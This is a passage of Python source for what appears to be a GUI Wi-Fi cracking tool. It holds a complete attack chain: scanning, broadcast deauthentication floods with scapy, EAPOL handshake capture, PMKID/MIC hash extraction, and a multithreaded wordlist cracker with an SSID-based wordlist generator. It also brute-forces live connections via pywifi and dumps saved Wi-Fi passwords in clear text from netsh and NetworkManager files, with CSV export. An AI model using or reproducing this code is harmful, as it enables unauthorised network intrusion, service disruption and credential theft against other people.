            r = subprocess.run(["nmcli", "-t", "-f", "BSSID,SIGNAL,CHAN,SECURITY,SSID", "dev", "wifi"], 
                               capture_output=True, text=True, timeout=10)
            if r.returncode == 0 and r.stdout.strip():
                for line in r.stdout.split('\n'):
                    if not line: continue
                    # nmcli escapes colons with backslash, replace it to avoid split errors
                    line_clean = line.replace('\\:', '_COLON_')
                    parts = line_clean.split(':')
                    if len(parts) >= 5:
                        bssid = parts[0].replace('_COLON_', ':')
                        sig = parts[1] + "%"
                        ch = parts[2]
                        auth = parts[3].replace('_COLON_', ':')
                        ssid = ':'.join(parts[4:]).replace('_COLON_', ':') or "(Hidden)"
                        band = "5 GHz" if safe_int(ch) > 14 else "2.4 GHz"
                        # Prevent duplicate BSSIDs
                        if bssid not in [n["bssid"] for n in self.networks]:
                            self.networks.append({"ssid": ssid, "bssid": bssid, "signal": sig, "channel": ch, "band": band, "auth": auth})
                            self.log(f"  [+] {ssid:<20} {bssid}  ch{ch}", "ok")
                return
        except Exception as e:
            pass
            
        # Method 2: Legacy iwlist
        try:
            r = subprocess.run(["sudo", "iwlist", iface, "scan"],
                               capture_output=True, text=True, timeout=20)
        except Exception as e:
            self.log(f"[!] No valid scanner found (nmcli/iwlist): {e}", "err"); return
            
        for cell in re.split(r"Cell \d+", r.stdout)[1:]:
            n = {}
            m = re.search(r"Address:\s*([\dA-Fa-f:]{17})", cell)
            if m: n["bssid"] = m.group(1).upper()
            m = re.search(r'ESSID:"(.*?)"', cell)
            n["ssid"] = m.group(1) if m and m.group(1) else "(Hidden)"
            m = re.search(r"Channel[:\s]+(\d+)", cell)
            n["channel"] = m.group(1) if m else "?"
            m = re.search(r"Signal level[=:](-?\d+)", cell)
            n["signal"] = f"{max(0, min(100, 2*(int(m.group(1))+100)))}%" if m else "?"
            m = re.search(r"(WPA3|WPA2|WPA|WEP)", cell, re.I)
            n["auth"] = m.group(1) if m else "Open"
            n["band"] = "5 GHz" if safe_int(n.get("channel", "1")) > 14 else "2.4 GHz"
            if "bssid" in n:
                self.networks.append(n)
                self.log(f"  [+] {n['ssid']:<20} {n['bssid']}  ch{n['channel']}", "ok")

    def _fill_nets(self):
        for i in self.net_tree.get_children(): self.net_tree.delete(i)
        for n in sorted(self.networks, key=lambda x: safe_int(x.get("signal", "0")), reverse=True):
            self.net_tree.insert("", "end", values=(
                n.get("ssid"), n.get("bssid"), n.get("signal"),
                n.get("channel"), n.get("band"), n.get("auth")))
        self.lbl_ncount.config(text=f"Networks: {len(self.networks)}")

    # ════════════════════════════════════════════════════
    # HASH LOADING — the key to real cracking
    # ════════════════════════════════════════════════════
    def _load_hash(self):
        fp = filedialog.askopenfilename(
            parent=self.root,  # CRITICAL: prevents window disappearing
            title="Load Hash File",
            filetypes=[("Hashcat 22000", "*.hc22000"), ("All files", "*.*")]
        )
        if not fp: return
        self.log(f"[*] Loading hash: {fp}", "cmd")
        try:
            self.hashes = load_hashes(fp)
            self.hash_path = fp
            if self.hashes:
                self.v_hash.set(f"✓ {os.path.basename(fp)} — {len(self.hashes)} hash(es)")
                for h in self.hashes:
                    htype = "PMKID" if h.htype == 1 else "MIC"
                    self.log(f"  [+] {h.essid} ({htype}) AP:{h.mac_ap.hex()}", "ok")
                    # Auto-set target SSID from hash
                    if not self.selected:
                        self.selected = {"ssid": h.essid, "bssid": h.mac_ap.hex(),
                                         "signal": "?", "channel": "?", "band": "?", "auth": "WPA2"}
                        self._ui(lambda: self.lbl_target.config(
                            text=f"🎯  {h.essid}  (from hash file)", fg=GREEN))
                self.log(f"[✓] Loaded {len(self.hashes)} hash(es). Ready to crack!", "ok")
            else:
                self.v_hash.set("✗ No valid hashes found in file")
                self.log("[!] No valid WPA* lines found in file.", "err")
        except Exception as e:
            self.log(f"[!] Hash load error: {e}", "err")
            self.v_hash.set("✗ Error loading file")

    # ════════════════════════════════════════════════════
    # WORDLIST
    # ════════════════════════════════════════════════════
    def _browse_wl(self):
        fp = filedialog.askopenfilename(
            parent=self.root,  # CRITICAL: prevents window disappearing
            title="Select Wordlist",
            filetypes=[("Text files", "*.txt"), ("All", "*.*")]
        )
        if not fp: return
        self.v_wl_path.set(fp)
        self.log(f"[*] Wordlist: {fp}", "cmd")
        # Count lines in background without blocking
        def count():
            n = count_lines(fp)
            self.v_wl_count.set(n)
            self.log(f"[✓] Wordlist: {n:,} passwords", "ok")
        threading.Thread(target=count, daemon=True).start()

    def _gen_wl(self):
        if not self.selected:
            messagebox.showinfo("Info", "Select a network first.", parent=self.root)
            return
        ssid = self.selected["ssid"]
        fp = filedialog.asksaveasfilename(
            parent=self.root,
            title="Save Wordlist", defaultextension=".txt",
            initialfile=f"wl_{ssid}.txt"
        )
        if not fp: return
        def work():
            self.log(f"[*] Generating wordlist for '{ssid}'…", "cmd")
            words = set(BUILTIN_WORDS)
            base = re.sub(r'\W+', '', ssid).lower()
            for t in ["", "1", "12", "123", "1234", "!", "#", "@", "wifi", "pass",
                       "2024", "2025", "2026"]:
                for b in (base, base.capitalize(), base.upper()):
                    words.add(b + t)
            for i in range(100): words.add(f"{base}{i}")
            for yr in range(2015, 2027): words.add(f"{base}{yr}")
            valid = sorted(w for w in words if 8 <= len(w) <= 63)
            with open(fp, "w") as f: f.write("\n".join(valid) + "\n")
            self.v_wl_path.set(fp)
            self.v_wl_count.set(len(valid))
            self.log(f"[✓] Generated {len(valid):,} passwords → {fp}", "ok")
        threading.Thread(target=work, daemon=True).start()

    def _iter_words(self):
        path = self.v_wl_path.get()
        if path.startswith("⟨"):
            yield from BUILTIN_WORDS
        else:
            try:
                with open(path, "r", encoding="utf-8", errors="ignore") as f:
                    for line in f:
                        w = line.strip()
                        if w: yield w
            except Exception as e:
                self.log(f"[!] Wordlist error: {e}", "err")

    # ════════════════════════════════════════════════════
    # AUTO ATTACK — One-click full chain
    # ════════════════════════════════════════════════════
    def _do_crack(self):
        if self.running: return
        if not self.selected:
            messagebox.showinfo("Info", "Scan and select a network first.", parent=self.root)
            return
        self.running = True
        self.cancel_ev.clear()
        self.btn_crack.config(state="disabled")
        self.btn_cancel.config(state="normal")
        self._set_status("ATTACKING…", RED)
        self.v_speed.set("—"); self.v_progress.set("0 %")
        self.v_eta.set("—"); self.v_tested.set("0 / 0")
        self.v_pw.set("🔒  attacking…")
        self.crack_bar.config(value=0)
        self.nb.select(4)  # log tab
        self._thread(self._auto_attack)

    def _auto_attack(self):
        """Full automated attack chain."""
        ssid = self.selected["ssid"]
        bssid = self.selected["bssid"]
        self.log(f"\n{'═'*55}", "cmd")
        self.log(f"  ⚡ AUTO ATTACK: {ssid} ({bssid})", "cmd")
        self.log(f"{'═'*55}\n", "cmd")

        # STEP 1: Check vault first (maybe password is already saved)
        self.log("[1] Checking saved passwords (vault)…", "cmd")
        vault_pw = self._vault_check(ssid)
        if vault_pw:
            self.log(f"[★] Password found in vault: {vault_pw}", "ok")
            self._show_result(vault_pw)
            return
        self.log("  Not in vault.", "dim")

        # STEP 2a: Active Injection Override
        if getattr(self, 'v_active_inject', None) and self.v_active_inject.get():
            self.log("\n[2] Active Protocol Injection authorized. Bypassing offline cryptographic capture.", "warn")
            self.log("    [!] Engaging target directly. This will interrupt host network connectivity temporarily.", "info")
            pw = self._active_brute_force(ssid)
            if pw:
                self._show_result(pw)
            elif self.cancel_ev.is_set():
                self.log("\n[!] Cancelled.", "warn")
                self._ui(lambda: self.v_pw.set("🔒  cancelled"))
            else:
                self.log("\n[✗] Password absent from current dictionary.", "err")
                self._ui(lambda: self.v_pw.set("🔒  not found"))
            return

        # STEP 2b: Get hash (auto-capture on Linux, or use loaded hash)
        if IS_LIN and self.adapter.monitor and SCAPY_OK:
            self.log("\n[2] Auto-capturing handshake (Linux)…", "cmd")
            captured = self._capture_handshake(ssid, bssid)
            if not captured and not self.hashes:
                self.log("[!] Capture failed and no hash loaded. Attack aborted.", "err")
                self._ui(lambda: self.v_pw.set("🔒  capture failed"))
                return
        elif not self.hashes:
            # Windows or no monitor — need manual hash or try to prompt import
            self.log("\n[2] No monitor mode — need hash file.", "warn")
            self.log("    Opening file dialog to import .hc22000…", "info")
            # Ask user to import hash file via UI thread
            import_done = threading.Event()
            def _ask_import():
                fp = filedialog.askopenfilename(
                    parent=self.root, title="Import Hash File for Attack",
                    filetypes=[("Hashcat 22000", "*.hc22000"), ("All", "*.*")])
                if fp:
                    try:
                        self.hashes = load_hashes(fp)
                        self.hash_path = fp
                        self.v_hash.set(f"✓ {os.path.basename(fp)} — {len(self.hashes)} hash(es)")
                        self.log(f"  Loaded {len(self.hashes)} hash(es) from {fp}", "ok")
                    except Exception as e:
                        self.log(f"  [!] Load error: {e}", "err")
                import_done.set()
            self._ui(_ask_import)
            import_done.wait(timeout=120)
            if not self.hashes:
                self.log("[!] No hash loaded. Attack aborted.", "err")
                self._ui(lambda: self.v_pw.set("🔒  no hash"))
                return
        else:
            self.log(f"\n[2] Using pre-loaded hash ({len(self.hashes)} hashes)", "info")

        # STEP 3: Crack
        self.log(f"\n[3] Cracking with wordlist ({self.v_wl_count.get():,} passwords)…", "cmd")
        pw = self._crack_hashes()

        if pw:
            self._show_result(pw)
        elif self.cancel_ev.is_set():
            self.log("\n[!] Cancelled.", "warn")
            self._ui(lambda: self.v_pw.set("🔒  cancelled"))
        else:
            self.log("\n[✗] Password NOT in wordlist. Try a bigger wordlist.", "err")
            self._ui(lambda: self.v_pw.set("🔒  not found"))

    def _show_result(self, pw):
        self.log(f"\n{'━'*55}", "ok")
        self.log(f"  ★  PASSWORD CRACKED:  {pw}", "ok")
        self.log(f"{'━'*55}\n", "ok")
        self._ui(lambda: self.v_pw.set(f"🔓  {pw}"))
        self._ui(lambda: [self.v_progress.set("100 %"), self.crack_bar.config(value=100)])

    # ════════════════════════════════════════════════════
    # ACTIVE INJECTION BRUTE-FORCE
    # ════════════════════════════════════════════════════
    def _active_brute_force(self, ssid):
        """Active connection brute-force utilizing pywifi."""
        if not PYWIFI_OK:
            self.log("[!] Python 'pywifi' module not installed. Active Brute-Force unavailable.", "err")
            return None
        
        try:
            wifi = pywifi.PyWiFi()
            ifaces = wifi.interfaces()
            if not ifaces:
                self.log("[!] No hardware WiFi interfaces accessible by pywifi.", "err")
                return None
            iface = ifaces[0]
        except Exception as e:
            self.log(f"[!] pywifi initialization failure: {e}", "err")
            return None
            
        self.log(f"  [>] Dominating interface: {iface.name()}", "dim")
        iface.disconnect()
        time.sleep(1)
        
        total = self.v_wl_count.get()
        tested = 0
        t0 = time.time()
        
        for pw in self._iter_words():
            if self.cancel_ev.is_set(): break
            tested += 1
            
            profile = pywifi.Profile()
            profile.ssid = ssid
            profile.auth = PWC.AUTH_ALG_OPEN
            profile.akm.append(PWC.AKM_TYPE_WPA2PSK)
            profile.cipher = PWC.CIPHER_TYPE_CCMP
            profile.key = pw
            
            iface.remove_all_network_profiles()
            tmp_profile = iface.add_network_profile(profile)
            
            self._ui(lambda te=tested, p=pw: [
                self.v_tested.set(f"{te:,} / {total:,}"),
                self.v_pw.set(f"🔒 injecting: {p}")
            ])
            
            now = time.time()
            elapsed = now - t0
            speed = tested / elapsed if elapsed > 0 else 0
            pct = min(99.9, tested / total * 100) if total else 0
            eta_s = (total - tested) / speed if speed > 0 else 0
            eta_str = f"{int(eta_s // 60)}:{int(eta_s % 60):02d}"
            
            if tested % 5 == 0:
                self._ui(lambda s=speed, p=pct, e=eta_str: [
                    self.v_speed.set(f"{s:,.2f} h/s"),
                    self.v_progress.set(f"{p:.1f} %"),
                    self.v_eta.set(e),
                    self.crack_bar.config(value=p)])
            
            iface.connect(tmp_profile)
            time.sleep(3) # Wait for connect
            
            if iface.status() == PWC.IFACE_CONNECTED:
                self.log(f"\n  [★] Cryptographic handshake accepted! Payload valid.", "ok")
                return pw
                
        return None

    def _vault_check(self, target_ssid):
        """Quick vault check for a specific SSID. Returns password or None."""
        if IS_WIN:
            try:
                r = subprocess.run(
                    ["netsh", "wlan", "show", "profile", f"name={target_ssid}", "key=clear"],
                    capture_output=True, text=True, timeout=10, creationflags=NO_WIN)
                m = re.search(r"Key Content\s*:\s*(.*)", r.stdout)
                if m and m.group(1).strip():
                    return m.group(1).strip()
            except Exception:
                pass
        elif IS_LIN:
            d = "/etc/NetworkManager/system-connections/"
            if os.path.isdir(d):
                for fn in os.listdir(d):
                    try:
                        with open(os.path.join(d, fn)) as f: txt = f.read()
                        if target_ssid in txt:
                            m = re.search(r"psk=(.*)", txt)
                            if m and m.group(1).strip():
                                return m.group(1).strip()
                    except Exception:
                        pass
        return None

    # ── Linux auto-capture: deauth → handshake → extract hash ──
    def _capture_handshake(self, ssid, bssid):
        """Deauth, capture EAPOL, extract PMKID/MIC. Returns True if hash extracted."""
        iface = self.adapter.name if self.adapter.name != "N/A" else "wlan0"
        mon = f"{iface}mon"
        ch = self.selected.get("channel", "1")

        # a) Enable monitor mode
        self.log("  [a] Enabling monitor mode…", "info")
        subprocess.run(["sudo", "airmon-ng", "check", "kill"],
                       check=False, capture_output=True)
        r = subprocess.run(["sudo", "airmon-ng", "start", iface],
                           capture_output=True, text=True)
        # Find actual monitor interface name (iw dev or ip link)
        try:
            r2 = subprocess.run(["iw", "dev"], capture_output=True, text=True)
            m = re.search(r"Interface\s+(\w+mon)\b", r2.stdout)
            if not m:
                r2 = subprocess.run(["ip", "link"], capture_output=True, text=True)
                m = re.search(r"^\d+:\s+(\w+mon):", r2.stdout, re.M)
        except Exception:
            m = None

        if m:
            mon = m.group(1)
        elif "monitor" not in r.stdout.lower() and f"{iface}mon" not in r.stdout:
            self.log("  [!] Could not verify monitor mode interface.", "err")
            self._restore_linux(iface)
            return False

        if not m:
            mon = f"{iface}mon"

        self.log(f"  Monitor interface: {mon} ✓", "ok")

        # b) Set channel
        self.log(f"  [b] Channel → {ch}", "info")
        try:
            r_ch = subprocess.run(["sudo", "iw", "dev", mon, "set", "channel", ch], capture_output=True)
            if r_ch.returncode != 0:
                subprocess.run(["sudo", "iwconfig", mon, "channel", ch], check=False)
        except Exception:
            pass

        # c) Deauth burst
        self.log("  [c] Sending deauth frames…", "info")
        try:
            pkt = (Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid)
                   / Dot11Deauth(reason=7))
            send(pkt, inter=0.03, count=200, iface=mon, verbose=False)
            self.log("  200 deauth frames sent ✓", "ok")
        except Exception as e:
            self.log(f"  Deauth warning: {e}", "warn")

        # d) Capture EAPOL handshake
        self.log("  [d] Listening for EAPOL handshake (45s timeout)…", "info")
        eapol_pkts = []
        def _cap(pkt):
            if pkt.haslayer(EAPOL):
                eapol_pkts.append(pkt)
                if len(eapol_pkts) >= 4:
                    return True  # Got enough
        try:
            sniff(prn=_cap, stop_filter=_cap, timeout=45, iface=mon,
                  filter=f"ether host {bssid}")
        except Exception as e:
            self.log(f"  Capture error: {e}", "err")

        # e) Restore wireless BEFORE cracking
        self._restore_linux(iface)

        if not eapol_pkts:
            self.log("  [!] No EAPOL frames captured.", "err")
            return False

        self.log(f"  Captured {len(eapol_pkts)} EAPOL frame(s) ✓", "ok")

        # f) Save pcap
        pcap_path = os.path.expanduser(f"~/wificrack_{ssid}.pcap")
        wrpcap(pcap_path, eapol_pkts)
        self.log(f"  Saved capture → {pcap_path}", "info")

        # g) Try to extract hash using hcxpcapngtool
        hc_path = os.path.expanduser(f"~/wificrack_{ssid}.hc22000")
        try:
            r = subprocess.run(["hcxpcapngtool", "-o", hc_path, pcap_path],
                               capture_output=True, text=True, timeout=30)
            if os.path.exists(hc_path) and os.path.getsize(hc_path) > 0:
                self.hashes = load_hashes(hc_path)
                self.hash_path = hc_path
                self.v_hash.set(f"✓ Auto-captured — {len(self.hashes)} hash(es)")
                self.log(f"  Extracted {len(self.hashes)} hash(es) ✓", "ok")
                return True
        except FileNotFoundError:
            self.log("  hcxpcapngtool not found — extracting manually…", "warn")
        except Exception as e:
            self.log(f"  hcxpcapngtool error: {e}", "warn")

        # h) Manual PMKID extraction from raw EAPOL packets
        self.log("  [h] Attempting manual PMKID extraction…", "info")
        for pkt in eapol_pkts:
            try:
                raw = bytes(pkt[EAPOL])
                # PMKID is in the first EAPOL message, in RSN KDE at the end
                # Key data starts at offset 77 in the EAPOL-Key frame
                if len(raw) > 100:
                    # Search for PMKID KDE tag (dd 14 00 0f ac 04)
                    kde_tag = b"\xdd\x14\x00\x0f\xac\x04"
                    idx = raw.find(kde_tag)
                    if idx >= 0:
                        pmkid = raw[idx+6:idx+22]
                        if len(pmkid) == 16 and pmkid != b"\x00"*16:
                            mac_ap = bytes.fromhex(bssid.replace(":", ""))
                            # Station MAC from the packet
                            mac_sta = b"\x00"*6
                            if hasattr(pkt, 'addr1'):
                                mac_sta = bytes.fromhex(pkt.addr1.replace(":", ""))
                            ssid_hex = ssid.encode("utf-8").hex()
                            hline = f"WPA*01*{pmkid.hex()}*{mac_ap.hex()}*{mac_sta.hex()}*{ssid_hex}*00*00"
                            self.hashes = [WPAHash(hline)]
                            self.v_hash.set(f"✓ PMKID extracted")
                            self.log(f"  PMKID extracted ✓: {pmkid.hex()}", "ok")
                            return True
            except Exception:
                pass

        # i) Try to build 4-way handshake hash from EAPOL messages
        if len(eapol_pkts) >= 2:
            try:
                mac_ap = bytes.fromhex(bssid.replace(":", ""))
                mac_sta = b"\x00"*6
                for pkt in eapol_pkts:
                    addr = getattr(pkt, 'addr1', None) or getattr(pkt, 'addr2', None)
                    if addr and addr.replace(":", "").lower() != bssid.replace(":", "").lower():
                        mac_sta = bytes.fromhex(addr.replace(":", ""))
                        break
                eapol_raw = bytes(eapol_pkts[1][EAPOL])
                anonce_raw = bytes(eapol_pkts[0][EAPOL])
                # ANonce is at offset 13 in EAPOL-Key
                anonce = anonce_raw[13:45] if len(anonce_raw) >= 45 else b"\x00"*32
                # MIC is at offset 77
                mic = eapol_raw[77:93] if len(eapol_raw) >= 93 else b"\x00"*16
                if mic != b"\x00"*16:
                    ssid_hex = ssid.encode("utf-8").hex()
                    hline = (f"WPA*02*{mic.hex()}*{mac_ap.hex()}*{mac_sta.hex()}"
                             f"*{ssid_hex}*{anonce.hex()}*{eapol_raw.hex()}")
                    self.hashes = [WPAHash(hline)]
                    self.v_hash.set(f"✓ 4-way MIC extracted")
                    self.log(f"  4-way handshake MIC extracted ✓", "ok")
                    return True
            except Exception as e:
                self.log(f"  Extraction error: {e}", "warn")

        self.log("  [!] Could not extract usable hash from capture.", "err")
        return False

    def _restore_linux(self, iface):
        """Restore managed mode and NetworkManager."""
        self.log("  Restoring wireless…", "dim")
        subprocess.run(["sudo", "airmon-ng", "stop", f"{iface}mon"],
                       check=False, capture_output=True)
        subprocess.run(["sudo", "systemctl", "start", "NetworkManager"],
                       check=False, capture_output=True)
        self.log("  Wireless restored ✓", "ok")

    # ── Multi-threaded hash cracking engine ──
    def _crack_hashes(self):
        """Crack loaded hashes against wordlist. Returns password or None."""
        if not self.hashes:
            self.log("[!] No hashes to crack.", "err")
            return None
        total = self.v_wl_count.get()
        self.log(f"  Hashes: {len(self.hashes)}  |  Wordlist: {total:,}  |  Threads: {os.cpu_count() or 1}", "info")

        tested = 0
        found = None
        t0 = time.time()
        last_ui = 0.0
        workers = max(1, os.cpu_count() or 2)

        def test_batch(batch):
            for pw in batch:
                if self.cancel_ev.is_set(): return None
                for h in self.hashes:
                    if h.test_password(pw):
                        return pw
            return None

        BATCH = workers * 4
        batch = []
        with ThreadPoolExecutor(max_workers=workers) as pool:
            futures = []
            for pw in self._iter_words():
                if self.cancel_ev.is_set() or found: break
                batch.append(pw)
                if len(batch) >= BATCH:
                    futures.append(pool.submit(test_batch, batch[:]))
                    tested += len(batch)
                    batch.clear()
                    # Check done futures
                    done = [f for f in futures if f.done()]
                    for f in done:
                        r = f.result()
                        if r: found = r
                        futures.remove(f)
                    # Stats update
                    now = time.time()
                    if now - last_ui >= 0.5:
                        last_ui = now
                        elapsed = now - t0
                        speed = tested / elapsed if elapsed > 0 else 0
                        pct = min(99.9, tested / total * 100) if total else 0
                        eta_s = (total - tested) / speed if speed > 0 else 0
                        eta_str = f"{int(eta_s // 60)}:{int(eta_s % 60):02d}"
                        self._ui(lambda s=speed, p=pct, e=eta_str, te=tested: [
                            self.v_speed.set(f"{s:,.0f} h/s"),
                            self.v_progress.set(f"{p:.1f} %"),
                            self.v_eta.set(e),
                            self.v_tested.set(f"{te:,} / {total:,}"),
                            self.crack_bar.config(value=p)])
                        self.log(f"  [{pct:5.1f}%]  {speed:,.0f} h/s  {tested:,}/{total:,}  ETA {eta_str}", "dim")
            if batch and not self.cancel_ev.is_set() and not found:
                futures.append(pool.submit(test_batch, batch[:]))
                tested += len(batch)
            if not found:
                for f in futures:
                    r = f.result()
                    if r: found = r; break

        elapsed = time.time() - t0
        speed = tested / elapsed if elapsed > 0 else 0
        self.log(f"  {tested:,} tested in {elapsed:.1f}s ({speed:,.0f} h/s)", "info")
        return found

    # ════════════════════════════════════════════════════
    # VAULT
    # ════════════════════════════════════════════════════
    def _do_vault(self):
        if self.running: return
        self.running = True
        self._set_status("DUMPING…", ORANGE)
        self.log("\n[*] Dumping saved WiFi passwords…", "cmd")
        self._thread(self._vault_work)

    def _vault_work(self):
        results = []
        if IS_WIN: results = self._vault_win()
        elif IS_LIN: results = self._vault_lin()
        self._ui(lambda: self._fill_vault(results))
        self.log(f"[✓] {len(results)} saved profile(s).\n", "ok")

    def _vault_win(self):
        results = []
        try:
            r = subprocess.run(["netsh", "wlan", "show", "profiles"],
                               capture_output=True, text=True, timeout=10,
                               creationflags=NO_WIN)
        except Exception as e:
            self.log(f"[!] {e}", "err"); return results
        for pname in re.findall(r"All User Profile\s*:\s*(.*)", r.stdout):
            pname = pname.strip()
            if not pname: continue
            try:
                r2 = subprocess.run(
                    ["netsh", "wlan", "show", "profile", f"name={pname}", "key=clear"],
                    capture_output=True, text=True, timeout=10, creationflags=NO_WIN)
                pw_m = re.search(r"Key Content\s*:\s*(.*)", r2.stdout)
                au_m = re.search(r"Authentication\s*:\s*(.*)", r2.stdout)
                pw = pw_m.group(1).strip() if pw_m else ""
                au = au_m.group(1).strip() if au_m else "?"
                results.append(dict(ssid=pname, password=pw or "(none)", auth=au))
                self.log(f"  [+] {pname:<24} {pw or '(none)'}  [{au}]",
                         "ok" if pw else "warn")
            except Exception: pass
        return results

    def _vault_lin(self):
        results = []
        d = "/etc/NetworkManager/system-connections/"
        if not os.path.isdir(d):
            self.log("[!] NM dir not found", "warn"); return results
        for fn in os.listdir(d):
            try:
                with open(os.path.join(d, fn)) as f: txt = f.read()
                ms = re.search(r"ssid=(.*)", txt)
                mp = re.search(r"psk=(.*)", txt)
                ssid = ms.group(1).strip() if ms else fn
                psk = mp.group(1).strip() if mp else "(none)"
                results.append(dict(ssid=ssid, password=psk, auth="WPA"))
                self.log(f"  [+] {ssid}: {psk}", "ok" if psk != "(none)" else "warn")
            except PermissionError:
                self.log(f"  [!] Denied: {fn} (run as root)", "err")
            except Exception: pass
        return results

    def _fill_vault(self, data):
        for i in self.vault_tree.get_children(): self.vault_tree.delete(i)
        for d in data:
            self.vault_tree.insert("", "end", values=(d["ssid"], d["password"], d["auth"]))

    def _export_vault(self):
        items = self.vault_tree.get_children()
        if not items:
            messagebox.showinfo("Empty", "No data. Run Dump first.", parent=self.root)
            return
        fp = filedialog.asksaveasfilename(parent=self.root, title="Export CSV",
                                          defaultextension=".csv", initialfile="wifi_vault.csv")
        if not fp: return
        with open(fp, "w", newline="") as f:
            w = csv.writer(f)
            w.writerow(["SSID", "Password", "Security"])
            for item in items:
                w.writerow(self.vault_tree.item(item, "values"))
        self.log(f"[✓] Exported → {fp}", "ok")
        messagebox.showinfo("Done", f"Saved to:\n{fp}", parent=self.root)


def run_wificracker(gui_instance):
    return WiFiCrackerApp(gui_instance)
